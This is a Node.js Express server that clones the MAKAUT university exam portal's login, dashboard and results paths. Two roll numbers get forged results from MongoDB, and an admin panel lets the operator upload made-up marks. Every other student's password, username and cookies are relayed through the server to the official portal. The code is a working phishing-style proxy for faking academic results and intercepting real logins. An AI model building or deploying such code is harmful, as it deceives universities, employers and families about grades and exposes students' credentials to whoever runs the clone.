const express = require('express');
const mongoose = require('mongoose');
const axios = require('axios');
const path = require('path');
const cookieParser = require('cookie-parser');

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

const MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/makaut_clone';
mongoose.connect(MONGO_URI)
    .then(() => console.log('Connected to MongoDB successfully.'))
    .catch(err => console.error('MongoDB connection error:', err));

const overrideSchema = new mongoose.Schema({
    roll_no: { type: String, required: true, unique: true },
    password: { type: String, required: true },
    student_name: { type: String, required: true },
    dashboard_data: { type: Object, required: true },
    results: { type: Array, required: true }
});

const OverrideStudent = mongoose.model('OverrideStudent', overrideSchema);
const ADMIN_SECRET = process.env.ADMIN_SECRET || 'makaut_admin_secret_2026';

// Middleware to protect Admin Routes
const requireAdmin = (req, res, next) => {
    if (req.cookies.admin_session === ADMIN_SECRET) {
        next();
    } else {
        res.redirect('/admin-portal');
    }
};

// --- ROUTES ---

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 1. Admin Login Page (Only asks for Secret Key)
app.get('/admin-portal', (req, res) => {
    res.render('admin_login', { error: null });
});

// 2. Admin Auth Processor
app.post('/admin-auth', (req, res) => {
    if (req.body.secret === ADMIN_SECRET) {
        res.cookie('admin_session', ADMIN_SECRET, { httpOnly: true });
        return res.redirect('/admin/dashboard');
    }
    res.render('admin_login', { error: 'Invalid Secret Key!' });
});

// 3. Admin Dashboard (Shows the two target roll numbers)
app.get('/admin/dashboard', requireAdmin, (req, res) => {
    res.render('admin_dashboard', { success: req.query.success });
});

// 4. Admin Edit Page (For the specific roll number clicked)
app.get('/admin/edit/:rollNo', requireAdmin, async (req, res) => {
    const rollNo = req.params.rollNo;
    const student = await OverrideStudent.findOne({ roll_no: rollNo });
    res.render('admin_edit', { rollNo: rollNo, student: student });
});

// 5. Admin Save Override Data
app.post('/api/admin/save-override', requireAdmin, async (req, res) => {
    const { roll_no, password, student_name, results_json } = req.body;
    try {
        const parsedResults = JSON.parse(results_json);
        await OverrideStudent.findOneAndUpdate(
            { roll_no },
            { 
                password, 
                student_name, 
                dashboard_data: { stream: "BCA", semester: "4th Semester" },
                results: parsedResults 
            },
            { upsert: true, new: true }
        );
        res.redirect('/admin/dashboard?success=Result successfully uploaded for Roll No: ' + roll_no);
    } catch (err) {
        res.send("Error saving data. Please ensure JSON format is correct. Error: " + err.message);
    }
});

// --- STUDENT LOGIN ROUTING (Intercepts the 2 custom users, proxies everyone else) ---
app.post('/smartexam/public/student-login', async (req, res) => {
    const rollNo = req.body.username || req.body.rollNo || req.body.txtUserName;
    const password = req.body.password || req.body.txtPassword;

    try {
        // Check MongoDB for custom records
        const customStudent = await OverrideStudent.findOne({ roll_no: rollNo?.trim() });

        if (customStudent && customStudent.password === password?.trim()) {
            // Serve Custom Data
            res.cookie('local_session', rollNo.trim(), { httpOnly: true });
            return res.redirect('/smartexam/public/student/dashboard');
        }

        // Forward everyone else to Official MAKAUT Portal
        const officialResponse = await axios.post('https://makaut1.ucanapply.com/smartexam/public/student-login', 
            new URLSearchParams(req.body), {
                headers: { 
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
                },
                maxRedirects: 0,
                validateStatus: status => status >= 200 && status < 400
            }
        );

        const setCookieHeader = officialResponse.headers['set-cookie'];
        if (setCookieHeader) {
            res.setHeader('Set-Cookie', setCookieHeader);
        }

        if (officialResponse.status === 302 || officialResponse.headers['location']) {
            return res.redirect(officialResponse.headers['location']);
        }

        return res.send(officialResponse.data);

    } catch (error) {
        console.error('Login routing error:', error.message);
        res.status(500).send("Error communicating with official verification server.");
    }
});

app.get('/smartexam/public/student/dashboard', async (req, res) => {
    const localSessionRoll = req.cookies.local_session;

    if (localSessionRoll) {
        const student = await OverrideStudent.findOne({ roll_no: localSessionRoll });
        if (student) return res.render('custom_dashboard', { student });
    }

    try {
        const cookieHeader = req.headers.cookie || '';
        const officialResponse = await axios.get('https://makaut1.ucanapply.com/smartexam/public/student/dashboard', {
            headers: { 'Cookie': cookieHeader, 'User-Agent': 'Mozilla/5.0' }
        });
        return res.send(officialResponse.data);
    } catch (err) {
        return res.redirect('/');
    }
});

app.get('/smartexam/public/student/student-activity', async (req, res) => {
    const localSessionRoll = req.cookies.local_session;

    if (localSessionRoll) {
        const student = await OverrideStudent.findOne({ roll_no: localSessionRoll });
        if (student) return res.render('custom_results', { student });
    }

    try {
        const cookieHeader = req.headers.cookie || '';
        const officialResponse = await axios.get('https://makaut1.ucanapply.com/smartexam/public/student/student-activity', {
            headers: { 'Cookie': cookieHeader, 'User-Agent': 'Mozilla/5.0' }
        });
        return res.send(officialResponse.data);
    } catch (err) {
        return res.redirect('/');
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
